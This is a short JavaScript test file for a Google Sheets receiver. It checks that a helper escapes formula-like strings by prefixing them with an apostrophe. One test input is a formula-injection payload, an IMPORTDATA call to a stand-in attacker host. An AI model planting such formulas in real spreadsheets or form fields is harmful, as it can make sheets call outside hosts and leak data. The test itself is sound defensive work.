import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import test from "node:test";
import vm from "node:vm";

const receiverSource = await readFile(new URL("../integrations/google-apps-script.gs", import.meta.url), "utf8");
const receiverContext = vm.createContext({});
vm.runInContext(receiverSource, receiverContext);

test("Google Sheets receiver neutralizes formula-like strings", () => {
  assert.equal(receiverContext.asSheetLiteral("=IMPORTDATA(\"https://attacker.example\")"), "'=IMPORTDATA(\"https://attacker.example\")");
  assert.equal(receiverContext.asSheetLiteral("+SUM(1,2)"), "'+SUM(1,2)");
  assert.equal(receiverContext.asSheetLiteral("-1+2"), "'-1+2");
  assert.equal(receiverContext.asSheetLiteral("@SUM(1,2)"), "'@SUM(1,2)");
  assert.equal(receiverContext.asSheetLiteral("ordinary text"), "ordinary text");
  assert.equal(receiverContext.asSheetLiteral(53), 53);
});
